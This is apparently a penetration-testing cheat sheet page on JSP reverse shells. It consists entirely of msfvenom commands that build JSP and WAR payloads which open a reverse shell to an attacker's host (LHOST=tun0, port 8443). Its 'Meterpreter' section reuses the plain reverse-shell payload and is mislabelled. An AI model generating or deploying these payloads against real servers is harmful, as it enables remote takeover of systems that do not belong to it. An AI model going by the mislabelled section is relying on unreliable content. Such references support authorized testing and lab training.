---
title: JSP Reverse Shells
layout: default
nav_order: 3
parent: Reverse Shells

---

# JSP Reverse Shell
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

### Non-meterpreter
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=8443 -f raw > shell.jsp
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=8443 -f war > shell.war
```


### Meterpreter
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=8443 -f raw > example.jsp
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=8443 -f war > example.war
```
